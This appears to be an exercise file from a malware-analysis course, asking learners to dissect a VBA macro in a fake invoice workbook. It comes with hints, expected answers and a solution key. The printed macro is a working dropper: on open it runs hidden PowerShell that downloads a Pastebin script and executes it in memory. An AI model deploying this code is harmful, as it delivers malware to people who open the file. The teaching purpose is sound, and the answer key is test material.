@@ -1,0 +1,17 @@
+{
+    "id": "task1",
+    "chapterId": "ch_10",
+    "title": "Analyze a Malicious Macro",
+    "description": "Practice reading and understanding VBA macro code to identify its malicious intent.",
+    "estimatedMinutes": 20,
+    "problemStatement": "# Objective: Macro Reverse Engineering\n\nAnalyze the following VBA macro found in an Excel document named `Invoice_44532.xlsm`. Answer the questions below.\n\n**VBA Code (Located in `ThisWorkbook`):**\n```vba\nPrivate Sub Workbook_Open()\n    Dim strURL As String\n    Dim strCmd As String\n    Dim objShell As Object\n    \n    strURL = \"https://pastebin.com/raw/abc123def\"\n    strCmd = \"powershell -WindowStyle Hidden -NoP -EP Bypass -Command \" & _\n              \"$wc=New-Object Net.WebClient;\" & _\n              \"$script=$wc.DownloadString('\" & strURL & \"');\" & _\n              \"IEX $script\"\n    \n    Set objShell = CreateObject(\"WScript.Shell\")\n    objShell.Run strCmd, 0, False\n    \n    Sheets(\"Lure\").Visible = xlSheetHidden\n    Sheets(\"Invoice\").Visible = xlSheetVisible\nEnd Sub\n```\n\n**Questions:**\n1. When does this macro execute?\n2. What is the purpose of the `strURL` variable?\n3. What does the PowerShell command do?\n4. What happens to the Excel sheets after the command runs?\n5. Is this macro writing any file to disk? Explain.\n\n**Output Format:**\n1. [Answer]\n2. [Answer]\n3. [Answer]\n4. [Answer]\n5. [Answer]",
+    "hints": [
+        "Hint 1: The subroutine name gives away the trigger.",
+        "Hint 2: `strURL` points to Pastebin, a common host for malicious scripts.",
+        "Hint 3: `DownloadString` and `IEX` together download and execute a script in memory.",
+        "Hint 4: The last two lines change worksheet visibility.",
+        "Hint 5: `IEX` executes directly; no `Out-File` or `>` redirection is used."
+    ],
+    "expectedOutput": "1. When the workbook is opened (Workbook_Open event).\n2. It holds the URL of a remote PowerShell script hosted on Pastebin.\n3. It downloads the script from the URL and executes it in memory using Invoke-Expression (IEX).\n4. The 'Lure' sheet is hidden, and the 'Invoice' sheet is made visible (showing the user a fake invoice).\n5. No. The PowerShell script is downloaded as a string and executed in memory via IEX. No file is saved to disk.",
+    "solutionCode": "1. Workbook_Open event triggers when file is opened and macros are enabled.\n2. Remote URL for second-stage payload.\n3. Downloads and memory-executes PowerShell script.\n4. Unhides the 'Invoice' sheet to display a fake invoice to the user.\n5. No disk write; IEX is memory-only execution."
+}
